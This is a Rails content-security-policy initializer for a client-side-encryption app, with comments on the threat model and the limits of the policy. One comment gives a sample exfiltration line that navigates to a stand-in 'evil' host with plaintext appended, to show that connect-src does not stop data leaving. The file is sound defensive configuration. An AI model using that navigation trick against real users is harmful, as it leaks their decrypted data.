# Be sure to restart your server when you modify this file.

# counta's whole guarantee is that key material stays in this browser tab, so
# the cost of any script injection is total: the DEK is in module scope and
# every decrypted blob is reachable from it. This CSP raises the bar for
# getting script to run at all — it is NOT containment once it does.
#
# Be precise about that, because the opposite is easy to assume: `connect-src`
# does not stop exfiltration by an executing script. Top-level navigation
# (`location = "https://evil/" + plaintext`) is not covered by any directive
# here — `navigate-to` was never shipped by browsers — so a script that runs
# can still get data out. Treat script execution as total compromise, exactly
# as the threat model says, and treat this file as defence in depth on top of
# escaping every interpolated value (`esc` in app.js).
#
# There are no third-party origins by design: no analytics, no CDNs, no fonts
# (docs/data-privacy.md).
Rails.application.configure do
  config.content_security_policy do |policy|
    policy.default_src :none
    policy.base_uri    :self
    policy.form_action :none            # nothing here submits a form
    policy.frame_ancestors :none        # clickjacking
    policy.connect_src :self            # exfiltration boundary
    policy.script_src  :self
    policy.style_src   :self
    policy.img_src     :self, :data     # :data for the generated kit QR/downloads
    policy.font_src    :self
    policy.object_src  :none
  end

  # Importmap emits an inline <script type="importmap">, so it needs a nonce
  # rather than 'unsafe-inline' (which would defeat the point of script-src).
  #
  # Per-request random, NOT session.id: visitors have no session until they
  # sign up, so a session-derived nonce is the empty string on first load and
  # the browser rejects `'nonce-'`, silently blocking all JS.
  config.content_security_policy_nonce_generator = ->(_request) { SecureRandom.base64(16) }
  config.content_security_policy_nonce_directives = %w[ script-src ]
end
